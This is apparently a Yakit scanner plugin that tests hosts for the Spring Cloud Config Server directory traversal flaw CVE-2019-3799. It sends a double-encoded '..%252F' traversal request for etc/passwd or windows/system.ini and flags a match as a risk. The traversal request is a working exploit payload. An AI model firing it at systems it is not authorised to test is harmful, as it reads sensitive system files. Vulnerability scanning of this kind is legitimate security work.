# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    payload = `etc/passwd`
    packet = `
GET /aaaa/aaaa/master/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F{{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

`
    // println(payload)
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    drsp, derr = str.ParseBytesToHTTPResponse(rsp)		// 判断状态码
    die(derr)
    if drsp.StatusCode != 200 {
        payload = `windows/system.ini`
        rsp,req,_ = poc.HTTP(packet, 
        poc.params({"target":addr,"payload":payload}),
        poc.https(isTls),
        poc.redirectTimes(0),
        )
        drsp, derr = str.ParseBytesToHTTPResponse(rsp)		// 判断状态码
        die(derr)
        if drsp.StatusCode == 200 {
            pass
        }else {
            return
        }
    }
    // dump(rsp)
    if len(rsp) > 0 {
        // println(string(rsp))
        if str.MatchAnyOfRegexp(rsp, `(\w+:\w:\d:\d:\w+:/\w+:/\w+/\w+)`) || str.MatchAllOfSubString(rsp, `EGA80WOA.FON=EGA80WOA.FON`){
            yakit.Info("%v SpringCloudConfig Server_CVE-2019-3799目录遍历漏洞", addr)
            risk.NewRisk(
            addr,risk.title("SpringCloudConfig Server_CVE-2019-3799目录遍历漏洞"),
            risk.severity("medium"),
            risk.titleVerbose("SpringCloudConfig Server_CVE-2019-3799目录遍历漏洞存在"),
            risk.type("目录遍历[Spring Cloud]"),
            risk.payload(`/foo/default/master/..%252F..%252F..%252F..%252F`),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在SpringCloudConfig Server_CVE-2019-3799目录遍历漏洞")
            }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}


// header="x-application-context: config-server"